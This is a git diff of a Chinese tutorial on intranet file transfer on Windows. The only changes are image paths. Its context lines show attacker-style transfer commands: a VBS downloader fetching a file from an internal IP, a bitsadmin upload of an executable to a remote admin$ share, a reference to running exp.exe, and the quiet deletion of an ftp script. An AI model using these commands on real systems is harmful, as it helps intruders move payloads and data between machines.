@@ -34,7 +34,7 @@ ftp文件的传输方式：
  del /F /Q ftp.txt             # 安静模式强制删除ftp文件
 ```
 
-![图片](/resource/内网文件传输技术-Windows篇.assets/640.png)
+![图片](resource/内网文件传输技术-Windows篇.assets/640.png)
 
 
 
@@ -69,7 +69,7 @@ set a=createobject(&#34;adod&#34;&#43;&#34;b.stream&#34;):set w=createobject(&#3
 cscript downfile.vbs http://192.168.126.130:8000/flag.txt  C:\Inetpub\b.txt
 ```
 
-![图片](/resource/内网文件传输技术-Windows篇.assets/640-20230220172700358.png)
+![图片](resource/内网文件传输技术-Windows篇.assets/640-20230220172700358.png)
 
 也可以把参数直接写入vbs文件中，直接执行。
 
@@ -106,7 +106,7 @@ exp.exe
 
 ```
 
-![图片](/resource/内网文件传输技术-Windows篇.assets/640-20230220172700839.png)
+![图片](resource/内网文件传输技术-Windows篇.assets/640-20230220172700839.png)
 
 默认下载为bin文件。但是不影响在命令行下使用。
 
@@ -155,7 +155,7 @@ bitsadmin /TRANSFER /UPLOAD c:\windows\temp\t.exe \\WEB\admin$\temp\t.exe
 
 ```
 
-![图片](/resource/内网文件传输技术-Windows篇.assets/640-20230220172700442.png)
+![图片](resource/内网文件传输技术-Windows篇.assets/640-20230220172700442.png)
 
 bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自 动重试，在比较复杂的网络环境下，有着不错的性能。
 
